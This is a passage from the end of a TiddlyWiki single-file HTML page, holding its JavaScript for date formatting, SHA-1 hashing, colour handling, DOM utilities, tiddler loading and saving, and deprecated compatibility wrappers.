	t = t.replace(/DDD/g,config.messages.dates.days[this.getDay()]);
	t = t.replace(/ddd/g,config.messages.dates.shortDays[this.getDay()]);
	t = t.replace(/0DD/g,String.zeroPad(this.getDate(),2));
	t = t.replace(/DDth/g,this.getDate()+this.daySuffix());
	t = t.replace(/DD/g,this.getDate());
	return t;
};

Date.prototype.getWeek = function()
{
	var dt = new Date(this.getTime());
	var d = dt.getDay();
	if (d==0) d=7;// JavaScript Sun=0, ISO Sun=7
	dt.setTime(dt.getTime()+(4-d)*86400000);// shift day to Thurs of same week to calculate weekNo
	var n = Math.floor((dt.getTime()-new Date(dt.getFullYear(),0,1)+3600000)/86400000); 
	return Math.floor(n/7)+1;
};

Date.prototype.getYearForWeekNo = function()
{
	var dt = new Date(this.getTime());
	var d = dt.getDay();
	if (d==0) d=7;// JavaScript Sun=0, ISO Sun=7
	dt.setTime(dt.getTime()+(4-d)*86400000);// shift day to Thurs of same week
	return dt.getFullYear();
};

Date.prototype.getHours12 = function()
{
	var h = this.getHours();
	return h > 12 ? h-12 : ( h > 0 ? h : 12 );
};

Date.prototype.getAmPm = function()
{
	return this.getHours() >= 12 ? config.messages.dates.pm : config.messages.dates.am;
};

Date.prototype.daySuffix = function()
{
	return config.messages.dates.daySuffixes[this.getDate()-1];
};

// Convert a date to local YYYYMMDDHHMM string format
Date.prototype.convertToLocalYYYYMMDDHHMM = function()
{
	return String.zeroPad(this.getFullYear(),4) + String.zeroPad(this.getMonth()+1,2) + String.zeroPad(this.getDate(),2) + String.zeroPad(this.getHours(),2) + String.zeroPad(this.getMinutes(),2);
};

// Convert a date to UTC YYYYMMDDHHMM string format
Date.prototype.convertToYYYYMMDDHHMM = function()
{
	return String.zeroPad(this.getUTCFullYear(),4) + String.zeroPad(this.getUTCMonth()+1,2) + String.zeroPad(this.getUTCDate(),2) + String.zeroPad(this.getUTCHours(),2) + String.zeroPad(this.getUTCMinutes(),2);
};

// Convert a date to UTC YYYYMMDD.HHMMSSMMM string format
Date.prototype.convertToYYYYMMDDHHMMSSMMM = function()
{
	return String.zeroPad(this.getUTCFullYear(),4) + String.zeroPad(this.getUTCMonth()+1,2) + String.zeroPad(this.getUTCDate(),2) + "." + String.zeroPad(this.getUTCHours(),2) + String.zeroPad(this.getUTCMinutes(),2) + String.zeroPad(this.getUTCSeconds(),2) + String.zeroPad(this.getUTCMilliseconds(),4);
};

// Static method to create a date from a UTC YYYYMMDDHHMM format string
Date.convertFromYYYYMMDDHHMM = function(d)
{
	return new Date(Date.UTC(parseInt(d.substr(0,4),10),
			parseInt(d.substr(4,2),10)-1,
			parseInt(d.substr(6,2),10),
			parseInt(d.substr(8,2),10),
			parseInt(d.substr(10,2),10),0,0));
};

//--
//-- Crypto functions and associated conversion routines
//--

// Crypto "namespace"
function Crypto() {}

// Convert a string to an array of big-endian 32-bit words
Crypto.strToBe32s = function(str)
{
	var be = Array();
	var len = Math.floor(str.length/4);
	var i, j;
	for(i=0, j=0; i<len; i++, j+=4) {
		be[i] = ((str.charCodeAt(j)&0xff) << 24)|((str.charCodeAt(j+1)&0xff) << 16)|((str.charCodeAt(j+2)&0xff) << 8)|(str.charCodeAt(j+3)&0xff);
	}
	while (j<str.length) {
		be[j>>2] |= (str.charCodeAt(j)&0xff)<<(24-(j*8)%32);
		j++;
	}
	return be;
};

// Convert an array of big-endian 32-bit words to a string
Crypto.be32sToStr = function(be)
{
	var str = "";
	for(var i=0;i<be.length*32;i+=8)
		str += String.fromCharCode((be[i>>5]>>>(24-i%32)) & 0xff);
	return str;
};

// Convert an array of big-endian 32-bit words to a hex string
Crypto.be32sToHex = function(be)
{
	var hex = "0123456789ABCDEF";
	var str = "";
	for(var i=0;i<be.length*4;i++)
		str += hex.charAt((be[i>>2]>>((3-i%4)*8+4))&0xF) + hex.charAt((be[i>>2]>>((3-i%4)*8))&0xF);
	return str;
};

// Return, in hex, the SHA-1 hash of a string
Crypto.hexSha1Str = function(str)
{
	return Crypto.be32sToHex(Crypto.sha1Str(str));
};

// Return the SHA-1 hash of a string
Crypto.sha1Str = function(str)
{
	return Crypto.sha1(Crypto.strToBe32s(str),str.length);
};

// Calculate the SHA-1 hash of an array of blen bytes of big-endian 32-bit words
Crypto.sha1 = function(x,blen)
{
	// Add 32-bit integers, wrapping at 32 bits
	add32 = function(a,b)
	{
		var lsw = (a&0xFFFF)+(b&0xFFFF);
		var msw = (a>>16)+(b>>16)+(lsw>>16);
		return (msw<<16)|(lsw&0xFFFF);
	};
	// Add five 32-bit integers, wrapping at 32 bits
	add32x5 = function(a,b,c,d,e)
	{
		var lsw = (a&0xFFFF)+(b&0xFFFF)+(c&0xFFFF)+(d&0xFFFF)+(e&0xFFFF);
		var msw = (a>>16)+(b>>16)+(c>>16)+(d>>16)+(e>>16)+(lsw>>16);
		return (msw<<16)|(lsw&0xFFFF);
	};
	// Bitwise rotate left a 32-bit integer by 1 bit
	rol32 = function(n)
	{
		return (n>>>31)|(n<<1);
	};

	var len = blen*8;
	// Append padding so length in bits is 448 mod 512
	x[len>>5] |= 0x80 << (24-len%32);
	// Append length
	x[((len+64>>9)<<4)+15] = len;
	var w = Array(80);

	var k1 = 0x5A827999;
	var k2 = 0x6ED9EBA1;
	var k3 = 0x8F1BBCDC;
	var k4 = 0xCA62C1D6;

	var h0 = 0x67452301;
	var h1 = 0xEFCDAB89;
	var h2 = 0x98BADCFE;
	var h3 = 0x10325476;
	var h4 = 0xC3D2E1F0;

	for(var i=0;i<x.length;i+=16) {
		var j,t;
		var a = h0;
		var b = h1;
		var c = h2;
		var d = h3;
		var e = h4;
		for(j = 0;j<16;j++) {
			w[j] = x[i+j];
			t = add32x5(e,(a>>>27)|(a<<5),d^(b&(c^d)),w[j],k1);
			e=d; d=c; c=(b>>>2)|(b<<30); b=a; a = t;
		}
		for(j=16;j<20;j++) {
			w[j] = rol32(w[j-3]^w[j-8]^w[j-14]^w[j-16]);
			t = add32x5(e,(a>>>27)|(a<<5),d^(b&(c^d)),w[j],k1);
			e=d; d=c; c=(b>>>2)|(b<<30); b=a; a = t;
		}
		for(j=20;j<40;j++) {
			w[j] = rol32(w[j-3]^w[j-8]^w[j-14]^w[j-16]);
			t = add32x5(e,(a>>>27)|(a<<5),b^c^d,w[j],k2);
			e=d; d=c; c=(b>>>2)|(b<<30); b=a; a = t;
		}
		for(j=40;j<60;j++) {
			w[j] = rol32(w[j-3]^w[j-8]^w[j-14]^w[j-16]);
			t = add32x5(e,(a>>>27)|(a<<5),(b&c)|(d&(b|c)),w[j],k3);
			e=d; d=c; c=(b>>>2)|(b<<30); b=a; a = t;
		}
		for(j=60;j<80;j++) {
			w[j] = rol32(w[j-3]^w[j-8]^w[j-14]^w[j-16]);
			t = add32x5(e,(a>>>27)|(a<<5),b^c^d,w[j],k4);
			e=d; d=c; c=(b>>>2)|(b<<30); b=a; a = t;
		}

		h0 = add32(h0,a);
		h1 = add32(h1,b);
		h2 = add32(h2,c);
		h3 = add32(h3,d);
		h4 = add32(h4,e);
	}
	return Array(h0,h1,h2,h3,h4);
};

//--
//-- RGB colour object
//--

// Construct an RGB colour object from a '#rrggbb', '#rgb' or 'rgb(n,n,n)' string or from separate r,g,b values
function RGB(r,g,b)
{
	this.r = 0;
	this.g = 0;
	this.b = 0;
	if(typeof r == "string") {
		if(r.substr(0,1) == "#") {
			if(r.length == 7) {
				this.r = parseInt(r.substr(1,2),16)/255;
				this.g = parseInt(r.substr(3,2),16)/255;
				this.b = parseInt(r.substr(5,2),16)/255;
			} else {
				this.r = parseInt(r.substr(1,1),16)/15;
				this.g = parseInt(r.substr(2,1),16)/15;
				this.b = parseInt(r.substr(3,1),16)/15;
			}
		} else {
			var rgbPattern = /rgb\s*\(\s*(\d{1,3})\s*,\s*(\d{1,3})\s*,\s*(\d{1,3})\s*\)/;
			var c = r.match(rgbPattern);
			if(c) {
				this.r = parseInt(c[1],10)/255;
				this.g = parseInt(c[2],10)/255;
				this.b = parseInt(c[3],10)/255;
			}
		}
	} else {
		this.r = r;
		this.g = g;
		this.b = b;
	}
	return this;
}

// Mixes this colour with another in a specified proportion
// c = other colour to mix
// f = 0..1 where 0 is this colour and 1 is the new colour
// Returns an RGB object
RGB.prototype.mix = function(c,f)
{
	return new RGB(this.r + (c.r-this.r) * f,this.g + (c.g-this.g) * f,this.b + (c.b-this.b) * f);
};

// Return an rgb colour as a #rrggbb format hex string
RGB.prototype.toString = function()
{
	return "#" + ("0" + Math.floor(this.r.clamp(0,1) * 255).toString(16)).right(2) +
				 ("0" + Math.floor(this.g.clamp(0,1) * 255).toString(16)).right(2) +
				 ("0" + Math.floor(this.b.clamp(0,1) * 255).toString(16)).right(2);
};

//--
//-- DOM utilities - many derived from www.quirksmode.org
//--

function drawGradient(place,horiz,colours)
{
	for(var t=0; t<= 100; t+=2) {
		var bar = document.createElement("div");
		place.appendChild(bar);
		bar.style.position = "absolute";
		bar.style.left = horiz ? t + "%" : 0;
		bar.style.top = horiz ? 0 : t + "%";
		bar.style.width = horiz ? (101-t) + "%" : "100%";
		bar.style.height = horiz ? "100%" : (101-t) + "%";
		bar.style.zIndex = -1;
		var f = t/100;
		var p = f*(colours.length-1);
		bar.style.backgroundColor = colours[Math.floor(p)].mix(colours[Math.ceil(p)],p-Math.floor(p)).toString();
	}
}

function createTiddlyText(theParent,theText)
{
	return theParent.appendChild(document.createTextNode(theText));
}

function createTiddlyCheckbox(theParent,caption,checked,onChange)
{
	var cb = document.createElement("input");
	cb.setAttribute("type","checkbox");
	cb.onclick = onChange;
	theParent.appendChild(cb);
	cb.checked = checked;
	cb.className = "chkOptionInput";
	if(caption)
		wikify(caption,theParent);
	return cb;
}

function createTiddlyElement(theParent,theElement,theID,theClass,theText)
{
	var e = document.createElement(theElement);
	if(theClass != null)
		e.className = theClass;
	if(theID != null)
		e.setAttribute("id",theID);
	if(theText != null)
		e.appendChild(document.createTextNode(theText));
	if(theParent != null)
		theParent.appendChild(e);
	return e;
}

function addEvent(obj,type,fn)
{
	if(obj.attachEvent) {
		obj['e'+type+fn] = fn;
		obj[type+fn] = function(){obj['e'+type+fn](window.event);};
		obj.attachEvent('on'+type,obj[type+fn]);
	} else {
		obj.addEventListener(type,fn,false);
	}
}

function removeEvent(obj,type,fn)
{
	if(obj.detachEvent) {
		obj.detachEvent('on'+type,obj[type+fn]);
		obj[type+fn] = null;
	} else {
		obj.removeEventListener(type,fn,false);
	}
}

function addClass(e,theClass)
{
	var currClass = e.className.split(" ");
	if(currClass.indexOf(theClass) == -1)
		e.className += " " + theClass;
}

function removeClass(e,theClass)
{
	var currClass = e.className.split(" ");
	var i = currClass.indexOf(theClass);
	while(i != -1) {
		currClass.splice(i,1);
		i = currClass.indexOf(theClass);
	}
	e.className = currClass.join(" ");
}

function hasClass(e,theClass)
{
	if(e.className) {
		if(e.className.split(" ").indexOf(theClass) != -1)
			return true;
	}
	return false;
}

// Find the closest relative with a given property value (property defaults to tagName, relative defaults to parentNode)
function findRelated(e,value,name,relative)
{
	name = name ? name : "tagName";
	relative = relative ? relative : "parentNode";
	if(name == "className") {
		while(e && !hasClass(e,value)) {
			e = e[relative];
		}
	} else {
		while(e && e[name] != value) {
			e = e[relative];
		}
	}
	return e;
}

// Resolve the target object of an event
function resolveTarget(e)
{
	var obj;
	if(e.target)
		obj = e.target;
	else if(e.srcElement)
		obj = e.srcElement;
	if(obj.nodeType == 3) // defeat Safari bug
		obj = obj.parentNode;
	return obj;
}

// Return the content of an element as plain text with no formatting
function getPlainText(e)
{
	var text = "";
	if(e.innerText)
		text = e.innerText;
	else if(e.textContent)
		text = e.textContent;
	return text;
}

// Get the scroll position for window.scrollTo necessary to scroll a given element into view
function ensureVisible(e)
{
	var posTop = findPosY(e);
	var posBot = posTop + e.offsetHeight;
	var winTop = findScrollY();
	var winHeight = findWindowHeight();
	var winBot = winTop + winHeight;
	if(posTop < winTop) {
		return posTop;
	} else if(posBot > winBot) {
		if(e.offsetHeight < winHeight)
			return posTop - (winHeight - e.offsetHeight);
		else
			return posTop;
	} else {
		return winTop;
	}
}

// Get the current width of the display window
function findWindowWidth()
{
	return window.innerWidth ? window.innerWidth : document.documentElement.clientWidth;
}

// Get the current height of the display window
function findWindowHeight()
{
	return window.innerHeight ? window.innerHeight : document.documentElement.clientHeight;
}

// Get the current horizontal page scroll position
function findScrollX()
{
	return window.scrollX ? window.scrollX : document.documentElement.scrollLeft;
}

// Get the current vertical page scroll position
function findScrollY()
{
	return window.scrollY ? window.scrollY : document.documentElement.scrollTop;
}

function findPosX(obj)
{
	var curleft = 0;
	while(obj.offsetParent) {
		curleft += obj.offsetLeft;
		obj = obj.offsetParent;
	}
	return curleft;
}

function findPosY(obj)
{
	var curtop = 0;
	while(obj.offsetParent) {
		curtop += obj.offsetTop;
		obj = obj.offsetParent;
	}
	return curtop;
}

// Blur a particular element
function blurElement(e)
{
	if(e != null && e.focus && e.blur) {
		e.focus();
		e.blur();
	}
}

// Create a non-breaking space
function insertSpacer(place)
{
	var e = document.createTextNode(String.fromCharCode(160));
	if(place)
		place.appendChild(e);
	return e;
}

// Remove all children of a node
function removeChildren(e)
{
	while(e && e.hasChildNodes())
		removeNode(e.firstChild);
}

// Remove a node and all it's children
function removeNode(e)
{
	scrubNode(e);
	e.parentNode.removeChild(e);
}

// Remove any event handlers or non-primitve custom attributes
function scrubNode(e)
{
	var att = e.attributes;
	if(att) {
		for(var t=0; t<att.length; t++) {
			var n = att[t].name;
			if(n !== 'style' && (typeof e[n] === 'function' || (typeof e[n] === 'object' && e[n] != null))) {
				try {
					e[n] = null;
				} catch(ex) {
				}
			}
		}
	}
	var c = e.firstChild;
	while(c) {
		scrubNode(c);
		c = c.nextSibling;
	}
}

// Add a stylesheet, replacing any previous custom stylesheet
function setStylesheet(s,id,doc)
{
	if(!id)
		id = "customStyleSheet";
	if(!doc)
		doc = document;
	var n = doc.getElementById(id);
	if(doc.createStyleSheet) {
		// Test for IE's non-standard createStyleSheet method
		if(n)
			n.parentNode.removeChild(n);
		// This failed without the &nbsp;
		doc.getElementsByTagName("head")[0].insertAdjacentHTML("beforeEnd","&nbsp;<style id='" + id + "'>" + s + "</style>");
	} else {
		if(n) {
			n.replaceChild(doc.createTextNode(s),n.firstChild);
		} else {
			n = doc.createElement("style");
			n.type = "text/css";
			n.id = id;
			n.appendChild(doc.createTextNode(s));
			doc.getElementsByTagName("head")[0].appendChild(n);
		}
	}
}

// Force the browser to do a document reflow when needed to workaround browser bugs
function forceReflow()
{
	if(config.browser.isGecko) {
		setStylesheet("body {top:-1em;margin-top:1em;}");
		setStylesheet("");
	}
}

// Replace the current selection of a textarea or text input and scroll it into view
function replaceSelection(e,text)
{
	if(e.setSelectionRange) {
		var oldpos = e.selectionStart;
		var isRange = e.selectionEnd > e.selectionStart;
		e.value = e.value.substr(0,e.selectionStart) + text + e.value.substr(e.selectionEnd);
		e.setSelectionRange(isRange ? oldpos : oldpos + text.length,oldpos + text.length);
		var linecount = e.value.split('\n').length;
		var thisline = e.value.substr(0,e.selectionStart).split('\n').length-1;
		e.scrollTop = Math.floor((thisline - e.rows / 2) * e.scrollHeight / linecount);
	} else if(document.selection) {
		var range = document.selection.createRange();
		if(range.parentElement() == e) {
			var isCollapsed = range.text == "";
			range.text = text;
			if(!isCollapsed) {
				range.moveStart('character', -text.length);
				range.select();
			}
		}
	}
}

// Returns the text of the given (text) node, possibly merging subsequent text nodes
function getNodeText(e)
{
	var t = ""; 
	while(e && e.nodeName == "#text") {
		t += e.nodeValue;
		e = e.nextSibling;
	}
	return t;
}

//--
//-- LoaderBase and SaverBase
//--

function LoaderBase() {}

LoaderBase.prototype.loadTiddler = function(store,node,tiddlers)
{
	var title = this.getTitle(store,node);
	if(title) {
		var tiddler = store.createTiddler(title);
		this.internalizeTiddler(store,tiddler,title,node);
		tiddlers.push(tiddler);
	}
};

LoaderBase.prototype.loadTiddlers = function(store,nodes)
{
	var tiddlers = [];
	for(var t = 0; t < nodes.length; t++) {
		try {
			this.loadTiddler(store,nodes[t],tiddlers);
		} catch(ex) {
			showException(ex,config.messages.tiddlerLoadError.format([this.getTitle(store,nodes[t])]));
		}
	}
	return tiddlers;
};

function SaverBase() {}

SaverBase.prototype.externalize = function(store)
{
	var results = [];
	var tiddlers = store.getTiddlers("title");
	for(var t = 0; t < tiddlers.length; t++)
		results.push(this.externalizeTiddler(store,tiddlers[t]));
	return results.join("\n");
};

//--
//-- TW21Loader (inherits from LoaderBase)
//--

function TW21Loader() {}

TW21Loader.prototype = new LoaderBase();

TW21Loader.prototype.getTitle = function(store,node)
{
	var title = null;
	if(node.getAttribute) {
		title = node.getAttribute("title");
		if(!title)
			title = node.getAttribute("tiddler");
	}
	if(!title && node.id) {
		var lenPrefix = store.idPrefix.length;
		if (node.id.substr(0,lenPrefix) == store.idPrefix)
			title = node.id.substr(lenPrefix);
	}
	return title;
};

TW21Loader.prototype.internalizeTiddler = function(store,tiddler,title,node)
{
	var e = node.firstChild;
	var text = null;
	if(node.getAttribute("tiddler")) {
		text = getNodeText(e).unescapeLineBreaks();
	} else {
		while(e.nodeName!="PRE" && e.nodeName!="pre") {
			e = e.nextSibling;
		}
		text = e.innerHTML.replace(/\r/mg,"").htmlDecode();
	}
	var modifier = node.getAttribute("modifier");
	var c = node.getAttribute("created");
	var m = node.getAttribute("modified");
	var created = c ? Date.convertFromYYYYMMDDHHMM(c) : version.date;
	var modified = m ? Date.convertFromYYYYMMDDHHMM(m) : created;
	var tags = node.getAttribute("tags");
	var fields = {};
	var attrs = node.attributes;
	for(var i = attrs.length-1; i >= 0; i--) {
		var name = attrs[i].name;
		if (attrs[i].specified && !TiddlyWiki.isStandardField(name)) {
			fields[name] = attrs[i].value.unescapeLineBreaks();
		}
	}
	tiddler.assign(title,text,modifier,modified,tags,created,fields);
	return tiddler;
};

//--
//-- TW21Saver (inherits from SaverBase)
//--

function TW21Saver() {}

TW21Saver.prototype = new SaverBase();

TW21Saver.prototype.externalizeTiddler = function(store,tiddler)
{
	try {
		var extendedAttributes = "";
		var usePre = config.options.chkUsePreForStorage;
		store.forEachField(tiddler,
			function(tiddler,fieldName,value) {
				// don't store stuff from the temp namespace
				if(typeof value != "string")
					value = "";
				if (!fieldName.match(/^temp\./))
					extendedAttributes += ' %0="%1"'.format([fieldName,value.escapeLineBreaks().htmlEncode()]);
			},true);
		var created = tiddler.created.convertToYYYYMMDDHHMM();
		var modified = tiddler.modified.convertToYYYYMMDDHHMM();
		var vdate = version.date.convertToYYYYMMDDHHMM();
		var attributes = tiddler.modifier ? ' modifier="' + tiddler.modifier.htmlEncode() + '"' : "";
		attributes += (usePre && modified == created) ? "" : ' modified="' + modified +'"';
		attributes += (usePre && created == vdate) ? "" :' created="' + created + '"';
		var tags = tiddler.getTags();
		if(!usePre || tags)
			attributes += ' tags="' + tags.htmlEncode() + '"';
		return ('<div %0="%1"%2%3>%4</'+'div>').format([
				usePre ? "title" : "tiddler",
				tiddler.title.htmlEncode(),
				attributes,
				extendedAttributes,
				usePre ? "\n<pre>" + tiddler.text.htmlEncode() + "</pre>\n" : tiddler.text.escapeLineBreaks().htmlEncode()
			]);
	} catch (ex) {
		throw exceptionText(ex,config.messages.tiddlerSaveError.format([tiddler.title]));
	}
};

//--
//-- Deprecated code
//--

// @Deprecated: Use createElementAndWikify and this.termRegExp instead
config.formatterHelpers.charFormatHelper = function(w)
{
	w.subWikify(createTiddlyElement(w.output,this.element),this.terminator);
};

// @Deprecated: Use enclosedTextHelper and this.lookaheadRegExp instead
config.formatterHelpers.monospacedByLineHelper = function(w)
{
	var lookaheadRegExp = new RegExp(this.lookahead,"mg");
	lookaheadRegExp.lastIndex = w.matchStart;
	var lookaheadMatch = lookaheadRegExp.exec(w.source);
	if(lookaheadMatch && lookaheadMatch.index == w.matchStart) {
		var text = lookaheadMatch[1];
		if(config.browser.isIE)
			text = text.replace(/\n/g,"\r");
		createTiddlyElement(w.output,"pre",null,null,text);
		w.nextMatch = lookaheadRegExp.lastIndex;
	}
};

// @Deprecated: Use <br> or <br /> instead of <<br>>
config.macros.br.handler = function(place)
{
	createTiddlyElement(place,"br");
};

// Find an entry in an array. Returns the array index or null
// @Deprecated: Use indexOf instead
Array.prototype.find = function(item)
{
	var i = this.indexOf(item);
	return i == -1 ? null : i;
};

// Load a tiddler from an HTML DIV. The caller should make sure to later call Tiddler.changed()
// @Deprecated: Use store.getLoader().internalizeTiddler instead
Tiddler.prototype.loadFromDiv = function(divRef,title)
{
	return store.getLoader().internalizeTiddler(store,this,title,divRef);
};

// Format the text for storage in an HTML DIV
// @Deprecated Use store.getSaver().externalizeTiddler instead.
Tiddler.prototype.saveToDiv = function()
{
	return store.getSaver().externalizeTiddler(store,this);
};

// @Deprecated: Use store.allTiddlersAsHtml() instead
function allTiddlersAsHtml()
{
	return store.allTiddlersAsHtml();
}

// @Deprecated: Use refreshPageTemplate instead
function applyPageTemplate(title)
{
	refreshPageTemplate(title);
}

// @Deprecated: Use story.displayTiddlers instead
function displayTiddlers(srcElement,titles,template,unused1,unused2,animate,unused3)
{
	story.displayTiddlers(srcElement,titles,template,animate);
}

// @Deprecated: Use story.displayTiddler instead
function displayTiddler(srcElement,title,template,unused1,unused2,animate,unused3)
{
	story.displayTiddler(srcElement,title,template,animate);
}

// @Deprecated: Use functions on right hand side directly instead
var createTiddlerPopup = Popup.create;
var scrollToTiddlerPopup = Popup.show;
var hideTiddlerPopup = Popup.remove;

// @Deprecated: Use right hand side directly instead
var regexpBackSlashEn = new RegExp("\\\\n","mg");
var regexpBackSlash = new RegExp("\\\\","mg");
var regexpBackSlashEss = new RegExp("\\\\s","mg");
var regexpNewLine = new RegExp("\n","mg");
var regexpCarriageReturn = new RegExp("\r","mg");
//--
//-- End of scripts
//--
//]]>
</script>
<script type="text/javascript">
//<![CDATA[
if(useJavaSaver)
	document.write("<applet style='position:absolute;left:-1px' name='TiddlySaver' code='TiddlySaver.class' archive='TiddlySaver.jar' width='1' height='1'></applet>");
//]]>
</script>
<!--POST-SCRIPT-START-->

<!--POST-SCRIPT-END-->
</body>
</html>
